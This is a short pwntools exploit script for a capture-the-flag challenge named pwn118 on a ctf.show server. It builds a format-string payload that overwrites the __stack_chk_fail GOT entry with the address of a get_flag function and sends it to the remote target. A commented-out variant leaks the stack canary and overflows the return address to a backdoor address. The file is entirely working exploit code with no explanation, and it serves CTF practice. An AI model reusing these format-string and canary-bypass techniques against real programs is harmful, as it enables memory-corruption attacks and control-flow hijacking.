from pwn import *
context.log_level = 'debug'
#io = process('./pwn')
io = remote('pwn.challenge.ctf.show',28185)
elf = ELF('./pwn118')
stack_chk_fail_got = elf.got['__stack_chk_fail']
getflag = elf.sym['get_flag']
payload = fmtstr_payload(7, {stack_chk_fail_got: getflag})
payload = payload.ljust(0x50, b'a')
io.sendline(payload)
io.recv()
io.interactive()


# from pwn import *
# io = remote("pwn.challenge.ctf.show",28185)
# # io = process("./pwn118")
# backdoor = 0x8048586
#
#
# # leak canary
# leak = io.sendline(b'%59$p')
# io.recvuntil(b'0x')
# canary = int(io.recv()[:8],16)
# print(canary)
#
# payload = b'a' *(0x50) + p32(canary) + b'a'*(0xC) + p32(backdoor)
# io.interactive()

